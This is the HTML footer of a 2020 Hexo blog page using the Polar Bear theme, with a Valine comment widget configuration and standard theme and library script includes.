        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
